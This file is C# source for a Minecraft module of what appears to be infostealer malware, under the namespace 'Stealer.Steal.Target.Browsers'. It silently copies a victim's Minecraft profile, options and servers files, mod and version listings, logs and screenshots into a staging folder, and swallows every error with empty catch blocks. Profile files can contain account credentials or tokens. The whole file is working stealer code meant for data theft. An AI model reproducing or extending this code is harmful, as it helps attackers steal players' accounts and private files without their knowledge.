using System;
using System.Collections.Generic;
using System.IO;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Browsers;

internal class Minecraft
{
	private static string MinecraftPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".minecraft");

	private static void SaveVersions(string sSavePath)
	{
		try
		{
			List<string> list = new List<string>();
			string[] directories = Directory.GetDirectories(Path.Combine(MinecraftPath, "versions"));
			foreach (string path in directories)
			{
				string name = new DirectoryInfo(path).Name;
				string text = Filemanager.DirectorySize(path) + " bytes";
				string text2 = Directory.GetCreationTime(path).ToString("yyyy-MM-dd h:mm:ss tt");
				list.Add("VERSION: " + name + "\n\tSIZE: " + text + "\n\tDATE: " + text2);
			}
			DynamicFiles.WriteAllText(Path.Combine(sSavePath, "versions.txt"), string.Join("\n\n", (IEnumerable<string?>)list.ToArray()));
		}
		catch
		{
		}
	}

	private static void SaveMods(string sSavePath)
	{
		try
		{
			List<string> list = new List<string>();
			string[] files = Directory.GetFiles(Path.Combine(MinecraftPath, "mods"));
			foreach (string text in files)
			{
				string fileName = Path.GetFileName(text);
				string text2 = new FileInfo(text).Length + " bytes";
				string text3 = File.GetCreationTime(text).ToString("yyyy-MM-dd h:mm:ss tt");
				list.Add("MOD: " + fileName + "\n\tSIZE: " + text2 + "\n\tDATE: " + text3);
			}
			DynamicFiles.WriteAllText(sSavePath + "\\mods.txt", string.Join("\n\n", (IEnumerable<string?>)list.ToArray()));
		}
		catch
		{
		}
	}

	private static void SaveScreenshots(string sSavePath)
	{
		try
		{
			string[] files = Directory.GetFiles(Path.Combine(MinecraftPath, "screenshots"));
			if (files.Length != 0)
			{
				string[] array = files;
				foreach (string path in array)
				{
					DynamicFiles.WriteAllBytes(sSavePath + "\\screenshots\\" + Path.GetFileName(path), File.ReadAllBytes(path));
				}
			}
		}
		catch
		{
		}
	}

	private static void SaveFiles(string sSavePath)
	{
		try
		{
			string[] files = Directory.GetFiles(MinecraftPath);
			for (int i = 0; i < files.Length; i++)
			{
				FileInfo fileInfo = new FileInfo(files[i]);
				string text = fileInfo.Name.ToLower();
				if (text.Contains("profile") || text.Contains("options") || text.Contains("servers"))
				{
					DynamicFiles.WriteAllBytes(Path.Combine(sSavePath, fileInfo.Name), File.ReadAllBytes(fileInfo.FullName));
				}
			}
		}
		catch
		{
		}
	}

	private static void SaveLogs(string sSavePath)
	{
		try
		{
			string path = Path.Combine(MinecraftPath, "logs");
			string path2 = Path.Combine(sSavePath, "logs");
			string[] files = Directory.GetFiles(path);
			for (int i = 0; i < files.Length; i++)
			{
				FileInfo fileInfo = new FileInfo(files[i]);
				if (fileInfo.Length < 5242880)
				{
					string path3 = Path.Combine(path2, fileInfo.Name);
					if (!File.Exists(path3))
					{
						DynamicFiles.WriteAllBytes(path3, File.ReadAllBytes(fileInfo.FullName));
					}
				}
			}
		}
		catch
		{
		}
	}

	public static void Start()
	{
		if (!Directory.Exists(MinecraftPath))
		{
			return;
		}
		Counter.Minecraft = true;
		try
		{
			string sSavePath = Path.Combine("Gaming", "Minecraft");
			SaveMods(sSavePath);
			SaveFiles(sSavePath);
			SaveVersions(sSavePath);
			SaveLogs(sSavePath);
			SaveScreenshots(sSavePath);
		}
		catch
		{
		}
	}
}
